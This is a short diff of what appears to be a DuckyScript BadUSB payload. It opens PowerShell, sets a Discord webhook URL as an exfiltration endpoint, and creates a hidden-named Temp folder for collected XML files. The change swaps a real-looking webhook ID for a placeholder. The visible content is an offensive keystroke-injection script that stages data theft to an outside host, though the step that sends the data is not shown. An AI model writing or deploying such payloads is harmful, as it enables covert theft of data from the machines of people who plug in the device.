@@ -12,7 +12,7 @@ ALTSTRING powershell
 ENTER
 DELAY 2000
 REM Save the Discord Webhook Endpoint in an variable.
-ALTSTRING $webhookUri = 'https://discord.com/api/webhooks/1065739856799617054/<Your Key>'
+ALTSTRING $webhookUri = 'https://discord.com/api/webhooks/<your_webhook_info>'
 ENTER
 REM Creating a new folder in Temp with random name to store the xml files.
 ALTSTRING New-Item -Path $env:temp -Name "476F6F6420426F7921" -ItemType "directory"
